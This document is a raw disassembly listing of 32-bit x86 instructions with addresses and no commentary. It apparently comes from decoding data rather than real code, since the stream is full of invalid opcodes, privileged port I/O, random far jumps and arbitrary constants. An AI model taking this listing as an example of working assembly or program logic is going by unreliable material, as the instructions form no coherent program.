  409f04:	dec    ebx
  409f05:	in     eax,dx
  409f06:	cdq    
  409f07:	adc    ecx,DWORD PTR [ebp-0x7ad09804]
  409f0d:	mov    al,0xf4
  409f0f:	inc    edi
  409f10:	or     ebx,0x738d4842
  409f16:	loope  0x409f74
  409f18:	ins    DWORD PTR es:[edi],dx
  409f19:	mov    BYTE PTR [esi+0x29],bl
  409f1c:	(bad)  [ecx-0x77b3a044]
  409f22:	test   al,0x6
  409f24:	add    BYTE PTR [bp+di],ch
  409f27:	jmp    0xb56634f4
  409f2c:	and    BYTE PTR [edx],ah
  409f2e:	dec    edi
  409f2f:	paddsb mm0,mm7
  409f32:	idiv   DWORD PTR [edi]
  409f34:	popf   
  409f35:	or     eax,0x9aa44865
  409f3a:	or     DWORD PTR [ecx],esp
  409f3c:	cmp    BYTE PTR [eax-0x3757ad87],0x1a
  409f43:	inc    esi
  409f44:	push   ebx
  409f45:	push   es
  409f46:	fwait
  409f47:	xor    BYTE PTR [esi+0x4e28c82d],bh
  409f4d:	xchg   BYTE PTR [eax+edx*8-0x7ed30866],ah
  409f54:	je     0x409fa2
  409f56:	sahf   
  409f57:	cmp    DWORD PTR [esi-0x5a],ebx
  409f5a:	pushf  
  409f5b:	mov    dl,0x9b
  409f5d:	push   esp
  409f5e:	aam    0x51
  409f60:	jnp    0x409f78
  409f62:	push   esi
  409f63:	lahf   
  409f64:	xor    al,0x58
  409f66:	je     0x409fe3
  409f68:	scas   eax,DWORD PTR es:[edi]
  409f69:	mov    DWORD PTR [ecx+0x660f05fe],ebx
  409f6f:	mov    eax,ds:0x9ca61641
  409f74:	sbb    dh,BYTE PTR [eax+0x2614b6b1]
  409f7a:	stc    
  409f7b:	inc    eax
  409f7c:	aad    0xcd
  409f7e:	or     esi,DWORD PTR [esp]
  409f81:	mov    al,0x8a
  409f83:	test   eax,0xbfb85d0d
  409f88:	mov    edx,0x97e706a0
  409f8d:	add    esp,DWORD PTR [edx+ebx*8]
  409f90:	pop    ss
  409f91:	mov    ecx,ecx
  409f93:	retf   
  409f94:	repz call 0xb8533a27
  409f9a:	or     BYTE PTR [edi],0xc2
  409f9d:	cmp    esp,edi
  409f9f:	inc    ebx
  409fa0:	mov    dh,0x6b
  409fa2:	pop    ds
  409fa3:	mov    ds:0x6ace01b5,eax
  409fa8:	sahf   
  409fa9:	pop    ebp
  409faa:	loopne 0x409f35
  409fac:	retf   0x8f1a
  409faf:	mov    ebx,0x6f3754de
  409fb4:	out    0xce,eax
  409fb6:	add    eax,0x961c3152
  409fbb:	lgs    eax,FWORD PTR [ebx]
  409fbe:	iret   
  409fbf:	js     0x409fe2
  409fc1:	clc    
  409fc2:	into   
  409fc3:	pop    DWORD PTR [ecx+0x79]
  409fc6:	mov    DWORD PTR [ecx-0x31b3348b],ebp
  409fcc:	push   edx
  409fcd:	outs   dx,BYTE PTR ds:[esi]
  409fce:	fild   DWORD PTR [edx-0x61]
  409fd1:	jl     0x409ff5
  409fd3:	daa    
  409fd4:	retf   
  409fd5:	or     esp,DWORD PTR [edx-0x67]
  409fd8:	mov    bh,0xe5
  409fda:	or     BYTE PTR [edi+0x20],cl
  409fdd:	jge    0x409fa6
  409fdf:	cdq    
  409fe0:	mov    bh,0xfd
  409fe2:	adc    eax,0xa212efbd
  409fe7:	mov    esi,0x2817f9df
  409fec:	push   0xffffff85
  409fee:	sbb    DWORD PTR [esi],ecx
  409ff0:	push   edx
  409ff1:	imul   DWORD PTR [ebp-0x7a8bfa4f]
  409ff7:	sub    DWORD PTR [esi+0x67],ebx
  409ffa:	pop    ebp
  409ffb:	fucomp st(2)
  409ffd:	inc    esp
  409ffe:	out    0x3f,al
  40a000:	call   0x527bd99f
  40a005:	jno    0x409fef
  40a007:	std    
  40a008:	sub    esp,DWORD PTR [ecx]
  40a00a:	cld    
  40a00b:	mov    ebp,0x827846b9
  40a010:	sub    bl,bl
  40a012:	loope  0x40a07a
  40a014:	dec    esi
  40a015:	ror    edx,cl
  40a017:	jmp    0x71b6bd2
  40a01c:	push   ecx
  40a01d:	fnstsw WORD PTR [ebp+0x467b5403]
  40a023:	retf   
  40a024:	push   ebx
  40a025:	out    dx,eax
  40a026:	bound  ebx,QWORD PTR [edi+0x5b9aee1c]
  40a02c:	mov    bh,0x46
  40a02e:	in     al,0x6a
  40a030:	leave  
  40a031:	dec    esi
  40a032:	fsub   st(7),st
  40a034:	push   0x469a942c
  40a039:	fxch   st(2)
  40a03b:	fldenv [ecx]
  40a03d:	add    DWORD PTR [esi-0x49],ebx
  40a040:	stos   BYTE PTR es:[edi],al
  40a041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a042:	lahf   
  40a043:	out    0x31,al
  40a045:	cwde   
  40a046:	mov    esi,esp
  40a048:	xor    cl,BYTE PTR [edx+0x5c32ddf5]
  40a04e:	pop    edi
  40a04f:	in     al,dx
  40a050:	cwde   
  40a051:	push   ss
  40a052:	pop    ebx
  40a053:	rep stos BYTE PTR es:[edi],al
  40a055:	outs   dx,DWORD PTR ds:[esi]
  40a056:	ret    0xd5a7
  40a059:	pop    es
  40a05a:	jnp    0x40a000
  40a05c:	sar    cl,0xed
  40a05f:	daa    
  40a060:	das    
  40a061:	jnp    0x40a016
  40a063:	rol    BYTE PTR [ebp+0x31],0x9f
  40a067:	or     DWORD PTR [esi],ebp
  40a069:	dec    ecx
  40a06a:	pop    esp
  40a06b:	out    dx,eax
  40a06c:	retf   0xe408
  40a06f:	in     eax,0x18
  40a071:	xchg   DWORD PTR [ebx],ebp
  40a073:	cmp    al,0x2f
  40a075:	xchg   BYTE PTR [eax-0x50a4affe],cl
  40a07b:	mov    BYTE PTR [edx],dh
  40a07d:	mov    bh,0xe
  40a07f:	and    dl,BYTE PTR [esi]
  40a081:	xor    BYTE PTR [ecx],bl
  40a083:	aam    0x35
  40a085:	arpl   WORD PTR [ecx+0x35854179],bx
  40a08b:	inc    ebp
  40a08c:	add    BYTE PTR [ebx],al
  40a08e:	dec    esp
  40a08f:	add    eax,0x151ecf1c
  40a094:	adc    cl,BYTE PTR [ecx-0x4a]
  40a097:	cmp    BYTE PTR [esi+ebx*1+0x1e],cl
  40a09b:	push   cs
  40a09c:	adc    eax,0xbc88b094
  40a0a1:	retf   
  40a0a2:	ds jecxz 0x40a0d5
  40a0a5:	inc    ecx
  40a0a6:	pop    edx
  40a0a7:	xor    eax,DWORD PTR [esi+edi*2-0x1a]
  40a0ab:	sbb    ch,BYTE PTR [ecx]
  40a0ad:	lahf   
  40a0ae:	mov    WORD PTR [ecx+edi*1+0x72d313d0],gs
  40a0b5:	adc    al,0x3a
  40a0b7:	call   0x97e09e83
  40a0bc:	imul   ch
  40a0be:	push   ds
  40a0bf:	sahf   
  40a0c0:	std    
  40a0c1:	mov    BYTE PTR [esi],bh
  40a0c3:	xchg   al,cl
  40a0c5:	or     al,0x82
  40a0c7:	fist   WORD PTR [esi]
  40a0c9:	outs   dx,DWORD PTR ds:[esi]
  40a0ca:	dec    ebp
  40a0cb:	mov    BYTE PTR [edi],ah
  40a0cd:	xchg   ebp,eax
  40a0ce:	iret   
  40a0cf:	retf   
  40a0d0:	cmp    eax,0x22c5996f
  40a0d5:	sub    BYTE PTR ss:[edx],ah
  40a0d8:	and    ch,BYTE PTR [ecx]
  40a0da:	loop   0x40a0ec
  40a0dc:	dec    edi
  40a0dd:	sbb    ebp,edi
  40a0df:	inc    ebp
  40a0e0:	(bad)  
  40a0e1:	fdivr  st,st(4)
  40a0e3:	adc    ch,bl
  40a0e5:	xchg   esi,eax
  40a0e6:	and    eax,0xf666a2a5
  40a0eb:	xchg   ebp,eax
  40a0ec:	mov    dh,0xf8
  40a0ee:	fadd   DWORD PTR [edx+0x6f]
  40a0f1:	mov    ebx,0x45ff4311
  40a0f6:	jge    0x40a0e6
  40a0f8:	inc    esp
  40a0f9:	scas   al,BYTE PTR es:[edi]
  40a0fa:	dec    esi
  40a0fb:	and    esp,DWORD PTR [ecx+0x4baa543e]
  40a101:	scas   eax,DWORD PTR es:[edi]
  40a102:	jp     0x40a0c6
  40a104:	fistp  WORD PTR [ebp+0x5e9f4ce]
  40a10a:	lock push 0x1fce701f
  40a110:	push   0xffffff9a
  40a112:	pushf  
  40a113:	dec    esi
  40a114:	lods   eax,DWORD PTR ds:[esi]
  40a115:	add    cl,BYTE PTR [ecx+0x2d]
  40a118:	adc    al,0xc0
  40a11a:	jne    0x40a0da
  40a11c:	ja     0x40a194
  40a11e:	mov    cl,0xec
  40a120:	popf   
  40a121:	lahf   
  40a122:	pop    ds
  40a123:	ins    DWORD PTR es:[edi],dx
  40a124:	clc    
  40a125:	ins    DWORD PTR es:[edi],dx
  40a126:	ds push ebp
  40a128:	cwde   
  40a129:	(bad)  
  40a12a:	out    dx,al
  40a12b:	push   edx
  40a12c:	hlt    
  40a12d:	jo     0x40a0c0
  40a12f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a130:	mov    BYTE PTR [edx],al
  40a132:	xchg   BYTE PTR [eax-0x11],bl
  40a135:	xchg   edi,eax
  40a136:	das    
  40a137:	jg     0x40a14c
  40a139:	or     edx,ebx
  40a13b:	jno    0x40a10a
  40a13d:	jmp    0x40a107
  40a13f:	sbb    bl,bl
  40a141:	lods   eax,DWORD PTR ds:[esi]
  40a142:	mov    edi,0xb6e6cd86
  40a147:	and    esi,DWORD PTR [edi-0x10284ff5]
  40a14d:	mov    ch,0xee
  40a14f:	adc    dl,BYTE PTR [edx-0x49]
  40a152:	repz aaa 
  40a154:	out    0x5,al
  40a156:	or     eax,0x816766a8
  40a15b:	imul   esi,eax,0xffffffc7
  40a15e:	sti    
  40a15f:	loop   0x40a1ab
  40a161:	stos   BYTE PTR es:[edi],al
  40a162:	or     BYTE PTR ss:[eax+0x34],bh
  40a166:	icebp  
  40a167:	popa   
  40a168:	or     BYTE PTR [edx+edx*2+0xd56fffc],ch
  40a16f:	mov    dl,0x6d
  40a171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a172:	ss jnp 0x40a17f
  40a175:	jo     0x40a0fc
  40a177:	lock jmp DWORD PTR [edi+0x6a81bbad]
  40a17e:	shr    DWORD PTR [ecx],cl
  40a180:	push   edi
  40a181:	pop    ebx
  40a182:	shr    DWORD PTR [edi-0x5ad44bfa],cl
  40a188:	mov    al,ds:0xf45451ce
  40a18d:	popa   
  40a18e:	push   esi
  40a18f:	inc    ebx
  40a190:	adc    eax,0x96e43b0b
  40a195:	test   al,0xa
  40a197:	lea    esi,[esi+0x6d8b5fb0]
  40a19d:	mov    bl,0xde
  40a19f:	push   edx
  40a1a0:	cmp    al,0xa5
  40a1a2:	inc    edi
  40a1a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1a4:	push   ebp
  40a1a5:	outs   dx,DWORD PTR ds:[esi]
  40a1a6:	retf   0x68f
  40a1a9:	mov    ebp,0xb2fbfa61
  40a1ae:	lahf   
  40a1af:	push   ss
  40a1b0:	nop
  40a1b1:	inc    esi
  40a1b2:	scas   eax,DWORD PTR es:[edi]
  40a1b3:	mov    ah,0xbb
  40a1b5:	test   DWORD PTR [esi+0x2c],esi
  40a1b8:	push   esi
  40a1b9:	adc    eax,0xa7486b63
  40a1be:	dec    ebp
  40a1bf:	pop    esp
  40a1c0:	daa    
  40a1c1:	jo     0x40a1a1
  40a1c3:	out    dx,al
  40a1c4:	ja     0x40a1c9
  40a1c6:	rcl    DWORD PTR [ebp+0x362a5d70],cl
  40a1cc:	pop    edi
  40a1cd:	xchg   ebx,eax
  40a1ce:	mov    ds:0x242f5f7a,eax
  40a1d3:	mov    ah,0x9d
  40a1d5:	cmp    ecx,DWORD PTR ds:0xad49adb6
  40a1db:	mov    ds:0x4700c192,eax
  40a1e0:	xor    BYTE PTR [ebp-0x18],ch
  40a1e3:	std    
  40a1e4:	scas   eax,DWORD PTR es:[edi]
  40a1e5:	retf   
  40a1e6:	clc    
  40a1e7:	repnz mov ebp,0x6487f04b
  40a1ed:	mov    ecx,edx
  40a1ef:	addr16 pop eax
  40a1f1:	xchg   edi,eax
  40a1f2:	fcmovu st,st(3)
  40a1f4:	sbb    al,0xa6
  40a1f6:	sar    edi,cl
  40a1f8:	or     BYTE PTR [ebp-0x41b43157],bh
  40a1fe:	ja     0x40a224
  40a200:	ja     0x40a1a7
  40a202:	rcl    DWORD PTR [ebp-0x754ff532],1
  40a208:	push   esp
  40a209:	fcom   DWORD PTR [ebp-0x1d]
  40a20c:	mov    DWORD PTR [eax],0x30e4a4e1
  40a212:	bnd jne 0x40a284
  40a215:	mov    bh,BYTE PTR ds:0x558a6aa3
  40a21b:	adc    eax,0xbf0c9c5a
  40a220:	mov    dh,BYTE PTR [edx-0x4f]
  40a223:	xor    esi,DWORD PTR [ebx+edi*4+0x50]
  40a227:	cmp    DWORD PTR [ecx],ebx
  40a229:	cmp    DWORD PTR [ebx-0x6c74a94e],ecx
  40a22f:	inc    ebp
  40a230:	sbb    eax,0x49439200
  40a235:	shr    DWORD PTR [ebx+0x5f],1
  40a238:	mov    ah,0xa2
  40a23a:	or     bl,bh
  40a23c:	sub    esp,ecx
  40a23e:	(bad)  
  40a23f:	fisubr DWORD PTR [edx+esi*8+0x68]
  40a243:	ret    0xbd47
  40a246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a247:	jae    0x40a278
  40a249:	push   0xf0838519
  40a24e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a24f:	xchg   BYTE PTR [ecx],bl
  40a251:	fcom   QWORD PTR [eax-0x49491ff8]
  40a257:	fdiv   st,st(4)
  40a259:	icebp  
  40a25a:	mov    ecx,0xae53aefc
  40a25f:	pop    esi
  40a260:	mov    ds:0xc0a9db39,eax
  40a265:	in     eax,0x3e
  40a267:	cmp    DWORD PTR [esi-0x6ee99f12],0xe1983aa5
  40a271:	and    dh,BYTE PTR [eax]
  40a273:	(bad)  
  40a274:	stos   BYTE PTR es:[edi],al
  40a275:	jne    0x40a213
  40a277:	scas   eax,DWORD PTR es:[edi]
  40a278:	cwde   
  40a279:	mov    edx,0x72584f10
  40a27e:	test   al,0xa0
  40a280:	jge    0x40a27e
  40a282:	out    dx,al
  40a283:	adc    eax,0x4f37c6ad
  40a288:	mov    esi,0x1b35e627
  40a28d:	push   esp
  40a28e:	test   al,0x33
  40a290:	xor    BYTE PTR [eax],0xc1
  40a293:	mov    eax,0xec0c0d81
  40a298:	and    BYTE PTR [ebx+0x6c],dl
  40a29b:	fist   WORD PTR [esi]
  40a29d:	lock jnp 0x40a30a
  40a2a0:	iret   
  40a2a1:	jne    0x40a269
  40a2a3:	repz or eax,0xe65b3376
  40a2a9:	add    edi,DWORD PTR [ebp+ebx*1+0x74]
  40a2ad:	xchg   ebx,eax
  40a2ae:	imul   eax,ebp,0x58
  40a2b1:	js     0x40a2c4
  40a2b3:	(bad)  
  40a2b4:	mov    ecx,cs
  40a2b6:	mov    al,ds:0x31ae5281
  40a2bb:	sub    al,ch
  40a2bd:	sti    
  40a2be:	ja     0x40a247
  40a2c0:	sub    al,0x49
  40a2c2:	pop    edi
  40a2c3:	or     al,0xac
  40a2c5:	loopne 0x40a2d5
  40a2c7:	or     BYTE PTR [edx],cl
  40a2c9:	jmp    0x40a287
  40a2cb:	je     0x40a294
  40a2cd:	cdq    
  40a2ce:	push   ecx
  40a2cf:	das    
  40a2d0:	dec    esp
  40a2d1:	imul   ecx,esp,0xd432fed6
  40a2d7:	cmp    BYTE PTR [ecx+0x42],cl
  40a2da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2db:	cmp    esi,DWORD PTR [edi-0x2e]
  40a2de:	sbb    BYTE PTR [ebp-0x4ad1a0fe],0x3c
  40a2e5:	scas   eax,DWORD PTR es:[edi]
  40a2e6:	xchg   ebx,eax
  40a2e7:	xchg   DWORD PTR [ecx],edi
  40a2e9:	mov    edi,0xbf1b8cbe
  40a2ee:	mov    ah,0x1c
  40a2f0:	ja     0x40a2b1
  40a2f2:	sub    al,0x85
  40a2f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2f5:	hlt    
  40a2f6:	popf   
  40a2f7:	lea    esp,[ebx]
  40a2f9:	pop    ds
  40a2fa:	pop    ebp
  40a2fb:	sbb    BYTE PTR [eax-0x7a9ec57f],ch
  40a301:	push   esi
  40a302:	inc    ebp
  40a303:	inc    ebx
  40a304:	adc    DWORD PTR [ebp+0x5686c5b8],eax
  40a30a:	aas    
  40a30b:	xchg   ebp,eax
  40a30c:	or     bl,bh
  40a30e:	and    dh,BYTE PTR [eax]
  40a310:	mov    dl,0x83
  40a312:	mov    esp,0x1f8e433a
  40a317:	je     0x40a343
  40a319:	nop
  40a31a:	inc    ebp
  40a31b:	dec    esi
  40a31c:	mov    WORD PTR [edx+esi*4],?
  40a31f:	pop    eax
  40a320:	inc    edx
  40a321:	mov    ecx,0x1cda35a5
  40a326:	pop    es
  40a327:	lahf   
  40a328:	push   es
  40a329:	sub    eax,0x9c2c88
  40a32e:	pusha  
  40a32f:	in     al,dx
  40a330:	dec    edx
  40a331:	mov    eax,ds:0x3d89ba0
  40a336:	in     al,0x46
  40a338:	or     cl,BYTE PTR [ebx-0x78]
  40a33b:	adc    al,0xfc
  40a33d:	into   
  40a33e:	mov    eax,0xfd12cf23
  40a343:	arpl   ax,bp
  40a345:	or     ch,ch
  40a347:	retf   
  40a348:	retf   
  40a349:	fnclex 
  40a34b:	or     ebx,edx
  40a34d:	xchg   edx,eax
  40a34e:	mov    cl,0x3
  40a350:	test   al,0xb4
  40a352:	stos   BYTE PTR es:[edi],al
  40a353:	adc    DWORD PTR [eax-0x748bd84d],edi
  40a359:	(bad)  
  40a35a:	jmp    0x41f8a4c4
  40a35f:	xchg   DWORD PTR es:[esi],ebp
  40a362:	xchg   ecx,eax
  40a363:	rol    DWORD PTR [di-0xe7a],0xf6
  40a369:	xchg   DWORD PTR [eax],eax
  40a36b:	iret   
  40a36c:	(bad)  
  40a36d:	in     eax,0x71
  40a36f:	pop    ebx
  40a370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a371:	mov    edx,0xf344faee
  40a376:	inc    ebx
  40a377:	adc    al,ah
  40a379:	out    dx,eax
  40a37a:	mov    ebp,0x2e3f7124
  40a37f:	add    bh,0x6b
  40a382:	or     DWORD PTR [edx-0x43ce8814],esi
  40a388:	or     BYTE PTR [edi-0x1996197d],cl
  40a38e:	inc    edx
  40a390:	js     0x40a36f
  40a392:	push   ds
  40a393:	lods   al,BYTE PTR ds:[esi]
  40a394:	shl    ebp,cl
  40a396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a397:	mul    BYTE PTR [esi+0x25f092c7]
  40a39d:	inc    eax
  40a39e:	ins    DWORD PTR es:[edi],dx
  40a39f:	pop    esi
  40a3a0:	and    DWORD PTR [edi],eax
  40a3a2:	leave  
  40a3a3:	dec    edi
  40a3a4:	out    0x2d,al
  40a3a6:	xlat   BYTE PTR ds:[ebx]
  40a3a7:	jno    0x40a33f
  40a3a9:	inc    edi
  40a3aa:	mov    bh,0x37
  40a3ac:	cmp    DWORD PTR [edi-0x51140768],ecx
  40a3b2:	sahf   
  40a3b3:	mov    ebx,0xc023ff80
  40a3b8:	mov    bl,0x1
  40a3ba:	xor    BYTE PTR [esp+eax*2],bl
  40a3bd:	js     0x40a35c
  40a3bf:	dec    esp
  40a3c0:	mov    ecx,0x2a8971db
  40a3c5:	dec    ebx
  40a3c6:	and    al,0x5b
  40a3c8:	mov    bh,0xfd
  40a3ca:	xchg   esi,eax
  40a3cb:	lds    edx,FWORD PTR [edx-0x20]
  40a3ce:	jmp    0x40a3b9
  40a3d0:	mov    ecx,0x84d9f346
  40a3d5:	and    ebp,edi
  40a3d7:	into   
  40a3d8:	push   ss
  40a3d9:	popf   
  40a3da:	lods   al,BYTE PTR ds:[esi]
  40a3db:	or     dh,BYTE PTR [edi+0x2ec0dc50]
  40a3e1:	loope  0x40a3ce
  40a3e3:	sahf   
  40a3e4:	data16 add ax,0x2e06
  40a3e9:	out    dx,eax
  40a3ea:	cmp    al,0x79
  40a3ec:	loope  0x40a428
  40a3ee:	and    al,0x4b
  40a3f0:	dec    ebx
  40a3f1:	xor    eax,0x46533f0
  40a3f6:	pop    esp
  40a3f7:	je     0x40a444
  40a3f9:	pop    ebx
  40a3fa:	in     eax,0xa3
  40a3fc:	mov    edx,0x16e11c62
  40a401:	clc    
  40a402:	adc    DWORD PTR [esp+eiz*2+0x8],0x4d
  40a407:	pushf  
  40a408:	push   ds
  40a409:	mov    dh,0x82
  40a40b:	das    
  40a40c:	out    dx,eax
  40a40d:	jae    0x40a445
  40a40f:	push   ds
  40a410:	shr    BYTE PTR [eax-0x6c],0x8a
  40a414:	jno    0x40a3a7
  40a416:	xor    dl,dh
  40a418:	clc    
  40a419:	clc    
  40a41a:	push   WORD PTR [eax+esi*2]
  40a41e:	fs or  ah,bh
  40a421:	in     eax,dx
  40a422:	cmc    
  40a423:	add    bh,BYTE PTR [edx-0x8286c21]
  40a429:	inc    esp
  40a42a:	shr    BYTE PTR [ecx],cl
  40a42c:	dec    edi
  40a42d:	pop    ds
  40a42e:	daa    
  40a42f:	sahf   
  40a430:	aas    
  40a431:	adc    DWORD PTR [esi],ecx
  40a433:	xchg   ebx,eax
  40a434:	test   al,0x22
  40a436:	test   BYTE PTR [eax],ch
  40a438:	or     DWORD PTR [ebx+0x31],eax
  40a43b:	out    0x21,al
  40a43d:	pop    ebx
  40a43e:	pop    es
  40a43f:	inc    ebx
  40a440:	sub    cl,bl
  40a442:	or     ebx,DWORD PTR ds:0xdbfeaeb0
  40a448:	std    
  40a449:	sub    ah,dl
  40a44b:	mov    eax,ecx
  40a44d:	in     eax,dx
  40a44e:	fisub  DWORD PTR [ebp+0x2d5d95be]
  40a454:	or     DWORD PTR [eax-0x4a],esi
  40a457:	sub    BYTE PTR [edx-0x25bade1d],ah
  40a45d:	mov    ds:0xe16e2180,eax
  40a462:	dec    edx
  40a463:	cs das 
  40a465:	fld    DWORD PTR [ebp-0x36]
  40a468:	std    
  40a469:	fisub  DWORD PTR [ebp-0x16]
  40a46c:	or     al,0x80
  40a46e:	pop    edx
  40a46f:	jb     0x40a4e2
  40a471:	cmc    
  40a472:	add    eax,0xa67ce4fe
  40a477:	jne    0x40a4e7
  40a479:	in     eax,0xac
  40a47b:	cmp    ch,bl
  40a47d:	daa    
  40a47e:	and    dh,BYTE PTR [eax+0x74]
  40a481:	xchg   ecx,eax
  40a482:	test   eax,esi
  40a484:	cmc    
  40a485:	enter  0xf6aa,0xe7
  40a489:	dec    DWORD PTR [esi]
  40a48b:	retf   
  40a48c:	imul   ecx,DWORD PTR ds:0xe9184e2b,0xffffffb5
  40a493:	in     eax,0x17
  40a495:	ins    BYTE PTR es:[edi],dx
  40a496:	cwde   
  40a497:	cmp    al,0x82
  40a499:	xor    al,0x53
  40a49b:	sub    al,0x79
  40a49d:	jns    0x40a4f8
  40a49f:	das    
  40a4a0:	add    ebx,DWORD PTR [ebx-0x1cecc91c]
  40a4a6:	inc    ebp
  40a4a7:	daa    
  40a4a8:	ja     0x40a462
  40a4aa:	inc    ebp
  40a4ab:	sub    esp,DWORD PTR gs:[edi+0x63]
  40a4af:	lea    esi,ds:0x88cdd6dc
  40a4b5:	call   0xd1c2:0x9811edc7
  40a4bc:	add    al,0xcb
  40a4be:	cmc    
  40a4bf:	mov    dl,0xc
  40a4c1:	jae    0x40a4ef
  40a4c3:	push   ebx
  40a4c4:	outs   dx,DWORD PTR ds:[esi]
  40a4c5:	cmp    al,0xdf
  40a4c7:	iret   
  40a4c8:	fnsave [esi]
  40a4ca:	mov    ch,0xb4
  40a4cc:	in     eax,dx
  40a4cd:	mov    ds:0x24ce0849,al
  40a4d2:	neg    BYTE PTR [ebx+0x71]
  40a4d5:	dec    ebp
  40a4d6:	cmp    eax,0x7b246503
  40a4db:	inc    ecx
  40a4dc:	out    0x53,eax
  40a4de:	fistp  WORD PTR [ecx+0x5]
  40a4e1:	sub    DWORD PTR [ebx],edx
  40a4e3:	into   
  40a4e4:	cmp    al,0x69
  40a4e6:	in     eax,0x77
  40a4e8:	into   
  40a4e9:	mov    ecx,0x25f53e56
  40a4ee:	in     eax,0x71
  40a4f0:	js     0x40a541
  40a4f2:	in     al,dx
  40a4f3:	adc    al,0x27
  40a4f5:	shr    DWORD PTR [ebx-0x6a0f337e],0xb5
  40a4fc:	sbb    ecx,DWORD PTR [ecx]
  40a4fe:	(bad)  
  40a4ff:	in     eax,0x14
  40a501:	jmp    0x977a:0xcd8d88b6
  40a508:	and    dl,BYTE PTR [esi+0x14]
  40a50b:	cmp    al,0xed
  40a50d:	or     BYTE PTR [edx+0x63],al
  40a510:	mov    cl,0x45
  40a512:	enter  0xc54b,0xa6
  40a516:	adc    DWORD PTR [esi+0x24],edi
  40a519:	cmovge esi,ebp
  40a51c:	mov    dl,0xa3
  40a51e:	das    
  40a51f:	and    al,0x4e
  40a521:	sahf   
  40a522:	pmuludq mm6,QWORD PTR [ebp-0x19]
  40a526:	aas    
  40a527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a529:	lds    ecx,FWORD PTR [ebp-0x4c]
  40a52c:	es jmp 0x6d46835d
  40a532:	rcl    DWORD PTR [esi],1
  40a534:	or     dh,BYTE PTR [ecx-0x19]
  40a537:	and    al,0x50
  40a539:	adc    DWORD PTR [eax+ebp*2+0x6e],eax
  40a53d:	test   BYTE PTR [edi-0x14],bh
  40a540:	hlt    
  40a541:	lahf   
  40a542:	lea    ebx,[esi]
  40a544:	ffree  st(4)
  40a546:	push   es
  40a547:	jne    0x40a52b
  40a549:	pop    es
  40a54a:	clc    
  40a54b:	cdq    
  40a54c:	ja     0x40a5af
  40a54e:	sbb    eax,0x5195bccf
  40a553:	aaa    
  40a554:	add    eax,0x239e356c
  40a559:	fdivr  DWORD PTR [esi+0x3d]
  40a55c:	sbb    BYTE PTR [ecx-0x43b99f4c],al
  40a562:	push   ds
  40a563:	push   0x5f32717f
  40a568:	mov    BYTE PTR [esi-0x55e8b4f3],bh
  40a56e:	lds    edx,FWORD PTR [ebx+0xe6d3b40]
  40a574:	xor    cl,dh
  40a576:	les    edi,FWORD PTR [edi+edi*2+0x3adb9c36]
  40a57d:	dec    edi
  40a57e:	dec    ebp
  40a57f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a580:	je     0x40a54f
  40a582:	fist   WORD PTR [ebp-0x7]
  40a585:	xchg   ebp,eax
  40a586:	mov    edi,0x6d0e8519
  40a58b:	call   0x5384:0xe6c6a857
  40a592:	cmp    DWORD PTR [ebx+0x3cf411ae],edx
  40a598:	mov    edx,0xa41db001
  40a59d:	push   es
  40a59e:	cmp    BYTE PTR [ebx+0x6a],ah
  40a5a1:	jmp    0x40a601
  40a5a3:	sar    BYTE PTR [ecx-0x29],1
  40a5a6:	pushf  
  40a5a7:	ds jbe 0x40a5ef
  40a5aa:	dec    edx
  40a5ab:	mov    edi,0x16a85c47
  40a5b0:	mul    DWORD PTR [ebx+0xe]
  40a5b3:	mov    esi,0x10aef9c2
  40a5b8:	outs   dx,BYTE PTR ds:[esi]
  40a5b9:	jmp    0x1bb2:0x26bbd674
  40a5c0:	fcmove st,st(0)
  40a5c2:	cwde   
  40a5c3:	jp     0x40a54a
  40a5c5:	js     0x40a61b
  40a5c7:	dec    edx
  40a5c8:	push   esi
  40a5c9:	fcom   DWORD PTR [ebx-0x33e7b7b8]
  40a5cf:	jno    0x40a5c7
  40a5d1:	jmp    0x40a601
  40a5d3:	or     DWORD PTR [edi],edx
  40a5d5:	mov    al,ds:0x118cdb2c
  40a5da:	imul   esi,DWORD PTR [esi-0x56553948],0xffffff98
  40a5e1:	xchg   DWORD PTR [ebp+ebp*8-0x2a],esi
  40a5e5:	xchg   esp,eax
  40a5e6:	mov    al,0x1a
  40a5e8:	stos   BYTE PTR es:[edi],al
  40a5e9:	(bad)  
  40a5ea:	ud0    esp,DWORD PTR [edi-0x71]
  40a5ee:	pop    ds
  40a5ef:	mov    ebp,0xb69b2d0a
  40a5f4:	pop    es
  40a5f5:	mov    cl,0xbe
  40a5f7:	and    DWORD PTR [esi+ebx*4-0x361beb9b],edx
  40a5fe:	(bad)  
  40a5ff:	pusha  
  40a600:	test   BYTE PTR [eax+eiz*4-0x7f],bh
  40a604:	iret   
  40a605:	xor    BYTE PTR [ebx],dl
  40a607:	lfs    edx,FWORD PTR ds:0x53594833
  40a60e:	mov    ds:0xea6059ec,eax
  40a613:	les    esi,FWORD PTR [eax+0x14]
  40a616:	push   0xfffffff7
  40a618:	mov    bh,dh
  40a61a:	xchg   BYTE PTR [edx+0x3301e256],cl
  40a620:	mov    eax,0x6c690570
  40a625:	inc    ebx
  40a626:	push   ebx
  40a627:	mov    eax,ds:0xbde1ea59
  40a62c:	push   ebx
  40a62d:	and    eax,0x98b5a940
  40a632:	add    ecx,DWORD PTR [ecx]
  40a634:	pop    ecx
  40a635:	bound  edx,QWORD PTR [eax+0x383bc8eb]
  40a63b:	not    BYTE PTR [ecx+0x2f]
  40a63e:	push   eax
  40a63f:	out    0xfd,al
  40a641:	jle    0x40a656
  40a643:	adc    DWORD PTR [ebx],esi
  40a645:	outs   dx,DWORD PTR ds:[esi]
  40a646:	lock cli 
  40a648:	fldcw  WORD PTR [edi+0x2]
  40a64b:	fisttp QWORD PTR [edx]
  40a64d:	retf   0xe13a
  40a650:	cld    
  40a651:	(bad)  
  40a652:	ja     0x40a65f
  40a654:	sub    al,0x9b
